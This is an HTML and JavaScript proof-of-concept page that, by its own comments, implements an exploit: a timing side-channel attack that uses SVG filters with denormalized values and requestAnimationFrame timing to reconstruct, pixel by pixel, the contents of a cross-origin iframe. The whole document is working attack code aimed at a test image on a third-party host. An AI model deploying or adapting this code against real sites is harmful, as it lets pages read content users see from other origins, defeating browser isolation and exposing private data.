<html>
<head>
<script>
var measurementsTotal, lastMeasurements;
var measurementsCount = 0;
var measurementsMax = 2; //number of times to run measure() for each pixel
var output, output2;
//determines target to analyse.
//dimensions of reference frame are actually hardcoded in HTML.
var targetX, targetY, targetWidth, targetHeight;
var currentX, currentY;
//single line array with two positions per pixel. 1st is normal, 2nd inverted.
var measurements;
var reconstructionCanvas, reconstruction;
var switchedAnalysis = true; //initial state.
var tstart;

//initialize the exploit
function init() {
	output = document.getElementById("output");
	output2 = document.getElementById("output2");
	reconstructionCanvas = document.getElementById("reconstruction");
	setTarget(0, 0, 10, 10); //example.com
	reconstructionCanvas.setAttribute("width", targetWidth);
	reconstructionCanvas.setAttribute("height", targetHeight);
	reconstruction = reconstructionCanvas.getContext("2d");
	measurements = new Array(targetWidth*targetHeight*2);
	for (var i = targetWidth*targetHeight*2-1; i>=0; --i) {
		measurements[i] = 0;
	}
	c = document.getElementById("outerContainer");
	frame = document.getElementById("frame");
	
	analyseTarget();
}

//single timing instance of filter application
function singleTiming(t) {
	tstart = t;
	c.setAttribute("style","-webkit-filter:url(#differentiate);");
	window.requestAnimationFrame(measure);
}



//calls singleTiming(), measurementsMax times.
//will update reconstruction and move to next pixel when done.
function measure(t) {
	lastMeasurement = t-tstart;
	c.setAttribute("style","");
	if (measurementsCount < 1) {
		measurementsTotal = 0;
	} else {
		measurementsTotal += lastMeasurement;
		console.log(measurementsTotal);
	}
	++measurementsCount;
	if (measurementsCount < measurementsMax) {
		window.requestAnimationFrame(singleTiming);
	} else {
		measurementsCount = 0;
		updateMeasurements();
		setTimeout(function(){ analyseTarget(); }, 0);
	}
}

//updates the reconstruction with latest measurements
function updateMeasurements() {
	var index = (currentX + currentY*targetWidth)*2;
	measurements[index + (switchedAnalysis?1:0)] += measurementsTotal;
	if (switchedAnalysis) {
		reconstructTarget(currentX, currentY, (measurements[index] > measurements[index+1])?1:0);
	}
}

//supplies the pixels in correct order and form to the measure function
function analyseTarget() {
	switchedAnalysis = !switchedAnalysis;
	var inverter = document.getElementById("inverter");
	if (switchedAnalysis) { //case: last analysis wasn't switched, so now measure inverse
		inverter.setAttribute("class","inverted");
		setTimeout(function(){ measure(); }, 0);
	} else if (nextPixel()) { //case: last analysis was switched, so execute nextPixel()
		inverter.setAttribute("class","");
		setTimeout(function(){ measure(); }, 0);
	}
}

//draws a pixel on the reconstruction canvas
function reconstructTarget(x,y,white) {
	var color = ""+(Math.round(white*255)).toString(16);
	var colorTemplate = "00" + color;
    var formattedColor = colorTemplate.substr(colorTemplate.length-2);
	reconstruction.fillStyle = "#"+formattedColor+formattedColor+formattedColor;
	reconstruction.fillRect(x,y,1,1); 
}

//sets the target space
function setTarget(x, y, width, height) {
	targetX=x;
	targetY=y;
	targetWidth=width;
	targetHeight=height;
	currentX=-1;
	currentY=0;
	ref = document.getElementById("referenceFrame");
	ref.setAttribute("style","top: "+(targetY-2)+"px; left: "+(targetX-2)+"px;");
}

//runs over pixels in target
//returns true once the function has completed
function nextPixel() {
	if (++currentX >= targetWidth) {
		currentX = 0;
		++currentY;
	}
	frame.setAttribute("style","top: "+(targetY-currentY-2)+"px; left: "+(targetX-currentX-2)+"px;");
	return (currentY < targetHeight);
}

</script>
<style>
#container {
	position: relative;
	width: 200px;
	height: 200px;
	opacity: 0.01;
	-webkit-filter: url(#switchAndSpread);
}

.inverted {
	-webkit-filter: url(#inverseBlackWhite);
}

.frame {
	position: absolute;
	width: 200px;
	height: 200px;
}
</style>
</head>
<body onload="init();"><!-- start the exploit once page has loaded -->

<!-- the svg containing the filters used for the attack -->
<svg style="position: absolute; height: 0; width: 0;">
<!-- differentiation between pixels by denormalized arithmetics, this filter gets timed -->
<filter id="differentiate">
 <feConvolveMatrix in="SourceGraphic"
 order="2 2" edgeMode="duplicate"
 kernelMatrix=
 "1e-40 1e-41 1e-42 1e-43"
 preserveAlpha="true" />
</filter>

<!-- inverses the color-->
<filter id="inverseBlackWhite">
 <feColorMatrix type="matrix"
     values="-1 0 0 0 1
			 0 -1 0 0 1
			 0 0 -1 0 1
			 0 0 0  0 1 "/>
</filter>

<!-- switches black/white between 797979/7A7A7A
	 black will be transparent, white opaque
     spreads out the pixel by tiling -->
<filter id="switchAndSpread">
 <feColorMatrix type="matrix"
     values="0.34 0.34 0.34 0 0.125
			 0.34 0.34 0.34 0 0.125
			 0.34 0.34 0.34 0 0.125
			 0.34 0.34 0.34 0 0.125" x="0" y="0" width="1" height="1"/>
 <feComponentTransfer>
    <feFuncR type="discrete" tableValues="0,1"/>
    <feFuncG type="discrete" tableValues="0,1"/>
    <feFuncB type="discrete" tableValues="0,1"/>
    <feFuncA type="discrete" tableValues="0,1"/>
 </feComponentTransfer>
 
<feTile x="0" y="0" width="200" height="200" result="spread"/>

<feTurbulence baseFrequency=".1" result="noise" />
    <feComposite operator="arithmetic" in="spread" in2="noise" k1="1" k2="0.9"/>
</filter>

<!-- morphs the pixels of the original picture to create a reference image
	 so we can compare the reconstruction to what was analyzed-->
<filter id="referencePicture">
 <feColorMatrix type="matrix"
     values="0.34 0.34 0.34 0 0.125
			 0.34 0.34 0.34 0 0.125
			 0.34 0.34 0.34 0 0.125
			 0    0    0    0 1"/>
 <feComponentTransfer>
    <feFuncR type="discrete" tableValues="0,1"/>
    <feFuncG type="discrete" tableValues="0,1"/>
    <feFuncB type="discrete" tableValues="0,1"/>
 </feComponentTransfer>
</filter>
</svg>

<!-- just a bunch of containers containing the actual target -->
<div id="backgroundFrame" style="position: absolute; z-index:-1; width: 200px; height: 200px;">
	<div id="outerContainer" class="" style="">
		<div id="container" class="" style="">
			<div id="inverter" class="" style="position: absolute; overflow: hidden; width:1px; height:1px; background-color:white;">
				<iframe src="http://res.imtt.qq.com/qqbrowser_x5/perryuwang/testpic.png" style="top: 0px; left: 0px;" id="frame" class="frame"></iframe>
			</div>
		</div>
	</div>
</div>

<!-- the reconstruction and reference images -->
<div id="reconstructionDiv" style="">Reconstruction / Reference<br />
	<canvas id="reconstruction" style="border:1px solid #000000; background-color:#AAAAAA"></canvas>
	<span style="border: 1px solid #000000; position:absolute; overflow:hidden; background-color:white; width:10px; height:10px; -webkit-filter: url(#referencePicture);">
		<iframe src="http://res.imtt.qq.com/qqbrowser_x5/perryuwang/testpic.png" class="frame" id="referenceFrame"></iframe>
	</span>
</div>
<div style="width:500px">Do not zoom the page during reconstruction, this will result in improper results.</div>
<div id="output"></div>
</body>
</html>